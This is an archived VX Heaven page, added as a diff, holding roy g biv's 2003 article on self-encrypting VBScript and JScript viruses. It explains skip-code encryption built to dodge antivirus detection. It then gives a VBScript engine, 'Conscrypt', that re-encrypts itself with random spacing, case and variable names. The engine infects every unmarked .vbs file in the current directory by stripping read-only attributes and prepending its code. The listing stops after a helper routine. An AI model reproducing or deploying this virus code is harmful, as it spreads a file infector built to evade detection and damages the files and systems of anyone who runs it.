@@ -1,0 +1,513 @@
+<?xml version="1.0"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<title> roy g biv 'Self-crypting script files' (VX heaven)</title>
+<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
+<meta name="Author" content="roy g biv"/>
+<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, roy g biv,Self-crypting script files, outch, rcase, random, outv, nvar, file, newl, decryptor, case, loff, number, attributes, readline, variable, packet"/>
+<meta name="Description" content="When thinking about the number of encrypted macro viruses, it is strange that there are not so many encrypted script viruses. I have no answer for why it is so. ;) Anyway, here I present a simple engine for encrypting VBScript and JScript files. It uses a variable skip-code encryption with oligomorphic decryptor. The cryptor supports variable spacing, random variable names, random variable case, random keyword case (VBScript only), and variable skip-codes with constant packet size. It can be used recursively, too."/>
+<script type="text/javascript">
+//<![CDATA[
+try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"74427e31a715717a67cf97b2c2373ebcc7cc3738-1498757113-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
+//]]>
+</script>
+<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vrg21.html"/>
+<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
+</head>
+<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
+<div class="s1">
+<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
+<div style="float: right;"><div id="plusone"></div></div>
+<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
+<div style="float: right;" class="addthis_toolbox addthis_default_style">
+<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
+<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
+<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
+</div>
+<div style="float: right;">
+<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
+<form action="/search.php" id="cse-search-box">
+<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
+<input type="hidden" name="cof" value="FORID:10"/>
+<input type="hidden" name="ie" value="UTF-8"/>
+<input type="text" name="q" size="12" value=" "/>
+<input type="submit" name="sa" value="Search"/>
+</form>
+</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
+<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
+</div>
+<div class="s2"><h1>Self-crypting script files</h1><p><a href="/lib/?lang=en&amp;author=roy%20g%20biv"> roy g biv</a><br/> <em><a href="/vx.php?fid=1224#f1224">29a [7]</a></em><br/> <em>February 2003</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vrg21.html';</script><div class="ci"><a href="/lib/?ci=vrg21">1</a></div>[<a style="" href="/lib/?lang=EN&amp;index=MA#vrg21">Back to index</a>] [<a href="/lib/vrg21.html#disqus_thread">Comments</a>]<br/> 
+<ul>
+<li><a href="#c0">Why not?</a></li>
+<li><a href="#c1">How?</a></li>
+<li><a href="#c2">Skip-codes (constant)</a></li>
+<li><a href="#c3">Skip-codes (variable)</a></li>
+<li><a href="#c4">And then...</a></li>
+</ul>
+<h2><a name="c0"></a>Why not?</h2>
+<p>When thinking about the number of encrypted macro viruses, it is strange that there are not so many encrypted script viruses. I have no answer for why it is so. ;) Anyway, here I present a simple engine for encrypting VBScript and JScript files. It uses a variable skip-code encryption with oligomorphic decryptor. The cryptor supports variable spacing, random variable names, random variable case, random keyword case (VBScript only), and variable skip-codes with constant packet size. It can be used recursively, too.</p>
+<h2><a name="c1"></a>How?</h2>
+<p>The difficulty of self-crypting scripts is because of needing the decrypted source in order to encrypt it again. The problem is then how to get decrypted source? There are two options here: the first is to rebuild the source at runtime, but this is not always easy and we want a simple engine. The second option is to decrypt the encrypted source, but this is easy only when the structure is weak (easy to find and easy to parse). This second is the option that we use here.</p>
+<h2><a name="c2"></a>Skip-codes (constant)</h2>
+<p>Constant skip-code encryption is simply that our character is every nth character in a string (s), where n is the value of the skip code. A plain string has n equal to 1, so our character is every character in the string. To encrypt is to increase the value of n, and fill the unused characters by random values. First, n=1:</p>
+<pre class="source">    this is our string</pre>
+<p>Then n=2, and unused characters are set to !:</p>
+<pre class="source">    !t!h!i!s! !i!s! !o!u!r! !s!t!r!i!n!g</pre>
+<p>and is accessed by this VBScript code:</p>
+<div class="vb" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #8D38C9; font-weight: bold;">for</span> i = n <span style="color: #8D38C9; font-weight: bold;">to</span> len(s) <span style="color: #8D38C9; font-weight: bold;">step</span> n<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; d = d + mid(s, i, 1)<br/>
+<span style="color: #8D38C9; font-weight: bold;">next</span><br/>
+&nbsp;</div>
+<p>or this JScript code:</p>
+<div class="javascript" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">d <span style="color: #339933;">=</span> <span style="color: #3366CC;">&quot;&quot;</span><br/>
+<span style="color: #000066; font-weight: bold;">for</span> <span style="color: black;">&#40;</span>i <span style="color: #339933;">=</span> n <span style="color: #339933;">-</span> <span style="color: #CC0000;">1</span><span style="color: #339933;">;</span> i <span style="color: #339933;">&lt;</span> s.<span style="color: #660066;">length</span><span style="color: #339933;">;</span> i <span style="color: #339933;">+=</span> n<span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; d <span style="color: #339933;">=</span> d <span style="color: #339933;">+</span> s.<span style="color: #660066;">charAt</span><span style="color: black;">&#40;</span>i<span style="color: black;">&#41;</span><br/>
+&nbsp;</div>
+<h2><a name="c3"></a>Skip-codes (variable)</h2>
+<p>Variable skip-code encryption is also that our character is every nth byte in a string, but now n can be a different value for every character. This is implemented by storing the characters in "packets" which contain the value of n. The packet size (p) can be either constant or variable. An example of constant packet size (p=3), with n as the first character in each packet, could look like this:</p>
+<pre class="source">    1t!2!h1i!2!s1 !2!i1s!2! 1o!2!u1r!2! 1s!2!t1r!2!i1n!2!g</pre>
+<p>In this example, the value of n alternates between 1 and 2. It is accessed by this VBScript code:</p>
+<div class="vb" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #8D38C9; font-weight: bold;">for</span> i = 1 <span style="color: #8D38C9; font-weight: bold;">to</span> len(s) <span style="color: #8D38C9; font-weight: bold;">step</span> p<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; d = d + mid(s, i + mid(s, i, 1), 1)<br/>
+<span style="color: #8D38C9; font-weight: bold;">next</span><br/>
+&nbsp;</div>
+<p>or this JScript code:</p>
+<div class="javascript" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">d <span style="color: #339933;">=</span> <span style="color: #3366CC;">&quot;&quot;</span><br/>
+<span style="color: #000066; font-weight: bold;">for</span> <span style="color: black;">&#40;</span>i <span style="color: #339933;">=</span> <span style="color: #CC0000;">0</span><span style="color: #339933;">;</span> i <span style="color: #339933;">&lt;</span> s.<span style="color: #660066;">length</span><span style="color: #339933;">;</span> i <span style="color: #339933;">+=</span> p<span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; d <span style="color: #339933;">=</span> d <span style="color: #339933;">+</span> s.<span style="color: #660066;">charAt</span><span style="color: black;">&#40;</span>i <span style="color: #339933;">+</span> <span style="color: black;">&#40;</span>s.<span style="color: #660066;">charAt</span><span style="color: black;">&#40;</span>i<span style="color: black;">&#41;</span> <span style="color: #339933;">&amp;</span> <span style="color: #CC0000;">15</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><br/>
+&nbsp;</div>
+<p>"charAt(i) &amp; 15" is fewer bytes than "charCodeAt(i) - 48", for same result.</p>
+<p>Variable packet size can be implemented by also storing the packet size in the packet. An example of variable packet size, with p as the first character in each packet, and n as the second character in each packet, could look like this:</p>
+<pre class="source">    32t!22h33!i22s32 !22i33!s22 32o!22u33!r22 32s!22t33!r22i32n!22g</pre>
+<p>In this example, the value of both p and n alternate between 2 and 3. It is accessed by this VBScript code:</p>
+<div class="vb" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #8D38C9; font-weight: bold;">for</span> i = 1 <span style="color: #8D38C9; font-weight: bold;">to</span> len(s)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; d = d + mid(s, i + mid(s, i + 1, 1), 1)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; i = i + mid(s, i, 1)<br/>
+<span style="color: #8D38C9; font-weight: bold;">next</span><br/>
+&nbsp;</div>
+<p>or this JScript code:</p>
+<div class="javascript" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">d <span style="color: #339933;">=</span> <span style="color: #3366CC;">&quot;&quot;</span><br/>
+<span style="color: #000066; font-weight: bold;">for</span> <span style="color: black;">&#40;</span>i <span style="color: #339933;">=</span> <span style="color: #CC0000;">0</span><span style="color: #339933;">;</span> i <span style="color: #339933;">&lt;</span> s.<span style="color: #660066;">length</span><span style="color: #339933;">;</span> i<span style="color: #339933;">++</span><span style="color: black;">&#41;</span><br/>
+<span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; d <span style="color: #339933;">=</span> d <span style="color: #339933;">+</span> s.<span style="color: #660066;">charAt</span><span style="color: black;">&#40;</span>i <span style="color: #339933;">+</span> <span style="color: black;">&#40;</span>s.<span style="color: #660066;">charAt</span><span style="color: black;">&#40;</span>i <span style="color: #339933;">+</span> <span style="color: #CC0000;">1</span><span style="color: black;">&#41;</span> <span style="color: #339933;">&amp;</span> <span style="color: #CC0000;">15</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; i <span style="color: #339933;">=</span> i <span style="color: #339933;">+</span> <span style="color: black;">&#40;</span>s.<span style="color: #660066;">charAt</span><span style="color: black;">&#40;</span>i<span style="color: black;">&#41;</span> <span style="color: #339933;">&amp;</span> <span style="color: #CC0000;">15</span><span style="color: black;">&#41;</span><br/>
+<span style="color: black;">&#125;</span><br/>
+&nbsp;</div>
+<p>The value of p (at mid(s, i, 1)) is 1 less than the real packet size because the for loop will increment i automatically.</p>
+<h2><a name="c4"></a>And then...</h2>
+<p>No matter how good is the encryption, the weak link is the decryptor. If the decryptor is extremely complex, or unique in some way, then no-one will bother with the encrypted code and will simply detect the decryptor itself. In the world of scripts, where encryption is more common, we can use a simple decryptor with little risk, because some harmless ones might look like ours. Also, this decryptor can be layered, but then it takes a long time to decrypt, and only the first layer is variable.</p>
+<p>Let's see the code. It requires only WSH v3+ because no new features are used. First is VBScript version.</p>
+<div class="vb" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">'Conscrypt - roy g biv 01/02/03<br/>
+</span><span style="color: #151B8D; font-weight: bold;">dim</span> loff,newl<br/>
+<span style="color: #151B8D; font-weight: bold;">set</span> fso=<span style="color: #E56717; font-weight: bold;">createobject</span>(<span style="color: #800000;">&quot;scripting.filesystemobject&quot;</span>)<br/>
+<span style="color: #151B8D; font-weight: bold;">set</span> file=fso.opentextfile(wscript.scriptfullname)<br/>
+bann=file.readline<br/>
+oldl=file.readline<br/>
+file.<span style="color: #8D38C9; font-weight: bold;">close</span><br/>
+<br/>
+randomize<br/>
+dospc 1<br/>
+<br/>
+rcase 8<br/>
+v1=nvar<br/>
+outch<span style="color: #800000;">&quot;(&quot;</span><br/>
+v2=nvar<br/>
+outch<span style="color: #800000;">&quot;)&quot;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">'function aaaaa(bbbbb)<br/>
+</span><br/>
+outch<span style="color: #800000;">&quot;:&quot;</span><br/>
+<br/>
+rcase 3<br/>
+v3=nvar<br/>
+outch<span style="color: #800000;">&quot;=&quot;</span><br/>
+outch<span style="color: #800000;">&quot;1&quot;</span><br/>
+rcase 2<br/>
+rcase 3<br/>
+outch<span style="color: #800000;">&quot;(&quot;</span><br/>
+outv v2<br/>
+outch<span style="color: #800000;">&quot;)&quot;</span><br/>
+rcase 4<br/>
+v5=mid(oldl,loff,1) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'old packet size<br/>
+</span>v6=int(rnd*7)+2 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'new data size: 2-8<br/>
+</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">'if you do not use ! character, then line can be<br/>
+</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">'v6=int(rnd*7)+2 &nbsp; &nbsp; &nbsp; &nbsp;'1-8<br/>
+</span>outch cstr(v6+1) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">'for ccccc=1 to len(bbbbb) step x<br/>
+</span><br/>
+outch<span style="color: #800000;">&quot;:&quot;</span><br/>
+<br/>
+v4=nvar<br/>
+outch<span style="color: #800000;">&quot;=&quot;</span><br/>
+rcase 4<br/>
+outch<span style="color: #800000;">&quot;(&quot;</span><br/>
+rcase 3<br/>
+outch<span style="color: #800000;">&quot;(&quot;</span><br/>
+outv v2<br/>
+outch<span style="color: #800000;">&quot;,&quot;</span><br/>
+outv v3<br/>
+outch<span style="color: #800000;">&quot;,&quot;</span><br/>
+outch<span style="color: #800000;">&quot;1&quot;</span><br/>
+outch<span style="color: #800000;">&quot;)&quot;</span><br/>
+outch<span style="color: #800000;">&quot;)&quot;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">'ddddd=cint(mid(bbbbb,ccccc,1))<br/>
+</span><br/>
+outch<span style="color: #800000;">&quot;:&quot;</span><br/>
+<br/>
+outv v1<br/>
+outch<span style="color: #800000;">&quot;=&quot;</span><br/>
+outv v1<br/>
+outch<span style="color: #800000;">&quot;+&quot;</span><br/>
+rcase 3<br/>
+outch<span style="color: #800000;">&quot;(&quot;</span><br/>
+rcase 3<br/>
+outch<span style="color: #800000;">&quot;(&quot;</span><br/>
+rcase 3<br/>
+outch<span style="color: #800000;">&quot;(&quot;</span><br/>
+outv v2<br/>
+outch<span style="color: #800000;">&quot;,&quot;</span><br/>
+outv v3<br/>
+outch<span style="color: #800000;">&quot;+&quot;</span><br/>
+outv v4<br/>
+outch<span style="color: #800000;">&quot;,&quot;</span><br/>
+outch<span style="color: #800000;">&quot;1&quot;</span><br/>
+outch<span style="color: #800000;">&quot;)&quot;</span><br/>
+outch<span style="color: #800000;">&quot;)&quot;</span><br/>
+outch<span style="color: #800000;">&quot;-&quot;</span><br/>
+outv v4<br/>
+outch<span style="color: #800000;">&quot;)&quot;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">'aaaaa=aaaaa+chr(asc(mid(bbbbb,ccccc+ddddd,1))-ddddd)<br/>
+</span><br/>
+outch<span style="color: #800000;">&quot;:&quot;</span><br/>
+<br/>
+rcase 4 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'next<br/>
+</span><br/>
+outch<span style="color: #800000;">&quot;:&quot;</span><br/>
+<br/>
+rcase 3<br/>
+rcase 8 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'end function<br/>
+</span><br/>
+outch<span style="color: #800000;">&quot;:&quot;</span><br/>
+<br/>
+rcase 7<br/>
+outch<span style="color: #800000;">&quot;(&quot;</span><br/>
+outv v1<br/>
+outch<span style="color: #800000;">&quot;(&quot;</span><br/>
+outch chr(34)<br/>
+cb=instr(mid(oldl,loff),chr(34))<br/>
+<br/>
+<span style="color: #8D38C9; font-weight: bold;">for</span> loff=loff <span style="color: #8D38C9; font-weight: bold;">to</span> loff+cb-v5 <span style="color: #8D38C9; font-weight: bold;">step</span> v5<br/>
+&nbsp; oldkey=cint(mid(oldl,loff,1))<br/>
+&nbsp; <span style="color: #8D38C9; font-weight: bold;">do</span><br/>
+&nbsp; &nbsp; nkey=int(rnd*v6)+1<br/>
+&nbsp; &nbsp; c=asc(mid(oldl,loff+oldkey,1))-oldkey+nkey<br/>
+&nbsp; <span style="color: #8D38C9; font-weight: bold;">loop</span> <span style="color: #8D38C9; font-weight: bold;">while</span> c=34or c&gt;127 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'no &quot; or 8-bit chars<br/>
+</span> &nbsp;newl=newl+cstr(nkey)<br/>
+&nbsp; <span style="color: #8D38C9; font-weight: bold;">for</span> kl=2to nkey<br/>
+&nbsp; &nbsp; newl=newl+rchar<br/>
+&nbsp; <span style="color: #8D38C9; font-weight: bold;">next</span><br/>
+&nbsp; newl=newl+chr(c)<br/>
+&nbsp; <span style="color: #8D38C9; font-weight: bold;">for</span> kl=kl <span style="color: #8D38C9; font-weight: bold;">to</span> v6<br/>
+&nbsp; &nbsp; newl=newl+rchar<br/>
+&nbsp; <span style="color: #8D38C9; font-weight: bold;">next</span><br/>
+<span style="color: #8D38C9; font-weight: bold;">next</span><br/>
+outch chr(34)<br/>
+outch<span style="color: #800000;">&quot;)&quot;</span><br/>
+outch<span style="color: #800000;">&quot;)&quot;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">'execute(aaaaa(&quot;encrypted code&quot;))<br/>
+</span><br/>
+<span style="color: #151B8D; font-weight: bold;">set</span> dir=fso.getfolder(<span style="color: #800000;">&quot;.&quot;</span>) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">'demo version, current directory only<br/>
+</span><span style="color: #8D38C9; font-weight: bold;">for</span> <span style="color: #8D38C9; font-weight: bold;">each</span> item <span style="color: #8D38C9; font-weight: bold;">in</span> dir.files<br/>
+&nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> lcase(fso.getextensionname(item))=<span style="color: #800000;">&quot;vbs&quot;</span><span style="color: #8D38C9; font-weight: bold;">then</span><br/>
+&nbsp; &nbsp; err=0<br/>
+&nbsp; &nbsp; <span style="color: #151B8D; font-weight: bold;">set</span> inf=fso.opentextfile(item,1) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">'open potential victim<br/>
+</span> &nbsp; &nbsp;<span style="color: #8D38C9; font-weight: bold;">if</span> err.number=0then<br/>
+&nbsp; &nbsp; &nbsp; fst=inf.read(1) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'read first character<br/>
+</span> &nbsp; &nbsp; &nbsp;<span style="color: #8D38C9; font-weight: bold;">if</span> fst&lt;&gt;<span style="color: #800000;">&quot;'&quot;</span><span style="color: #8D38C9; font-weight: bold;">then</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'check for infection marker<br/>
+</span> &nbsp; &nbsp; &nbsp; &nbsp;rest=inf.readall &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">'read entire file<br/>
+</span> &nbsp; &nbsp; &nbsp; &nbsp;attr=item.attributes &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">'save attributes<br/>
+</span> &nbsp; &nbsp; &nbsp; &nbsp;item.attributes=0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'remove any read-only attribute<br/>
+</span> &nbsp; &nbsp; &nbsp; &nbsp;err=0<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #151B8D; font-weight: bold;">set</span> outf=fso.opentextfile(item,2) &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'open file for writing<br/>
+</span> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #8D38C9; font-weight: bold;">if</span> err.number=0then<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; outf.writeline(bann) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">'prepend banner<br/>
+</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;outf.writeline(newl) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">'prepend code<br/>
+</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;outf.write(fst+rest) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">'append first character and host<br/>
+</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;outf.<span style="color: #8D38C9; font-weight: bold;">close</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">'close file (write mode)<br/>
+</span> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; item.attributes=attr &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">'restore attributes<br/>
+</span> &nbsp; &nbsp; &nbsp;<span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
+&nbsp; &nbsp; &nbsp; inf.<span style="color: #8D38C9; font-weight: bold;">close</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'close file (read mode)<br/>
+</span> &nbsp; &nbsp;<span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
+&nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
+<span style="color: #8D38C9; font-weight: bold;">next</span><br/>
+<br/>
+<span style="color: #E56717; font-weight: bold;">sub</span> dospc(curoff) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">'replace space with random number of spaces<br/>
+</span> &nbsp;<span style="color: #8D38C9; font-weight: bold;">if</span> mid(oldl,curoff,1)=<span style="color: #800000;">&quot; &quot;</span><span style="color: #8D38C9; font-weight: bold;">then</span><br/>
+&nbsp; &nbsp; newl=newl+space(rnd*5+1)<br/>
+&nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">while</span> mid(oldl,curoff,1)=<span style="color: #800000;">&quot; &quot;</span><br/>
+&nbsp; &nbsp; &nbsp; curoff=curoff+1<br/>
+&nbsp; &nbsp; wend<br/>
+&nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
+&nbsp; loff=curoff<br/>
+<span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #E56717; font-weight: bold;">sub</span><br/>
+<br/>
+<span style="color: #E56717; font-weight: bold;">sub</span> rcase(lineend) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">'random case switch on keywords<br/>
+</span> &nbsp;<span style="color: #8D38C9; font-weight: bold;">for</span> cb=loff <span style="color: #8D38C9; font-weight: bold;">to</span> loff+lineend-1<br/>
+&nbsp; &nbsp; newl=newl+chr(asc(mid(oldl,cb,1))<span style="color: #8D38C9; font-weight: bold;">xor</span>(int(rnd*2)*32))<br/>
+&nbsp; <span style="color: #8D38C9; font-weight: bold;">next</span><br/>
+&nbsp; dospc loff+lineend<br/>
+<span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #E56717; font-weight: bold;">sub</span><br/>
+<br/>
+<span style="color: #E56717; font-weight: bold;">function</span> rchar &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">'random case letter<br/>
+</span> &nbsp;rchar=chr(int(rnd*26)+65+int(rnd*2)*32)<br/>
+<span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #E56717; font-weight: bold;">function</span><br/>
+<br/>
+<span style="color: #E56717; font-weight: bold;">sub</span> outv(tvar) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">'variable followed by random number of spaces<br/>
+</span> &nbsp;newl=newl+tvar<br/>
+&nbsp; dospc loff+instr(mid(oldl,loff),<span style="color: #800000;">&quot; &quot;</span>)-1<br/>
+<span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #E56717; font-weight: bold;">sub</span><br/>
+<br/>
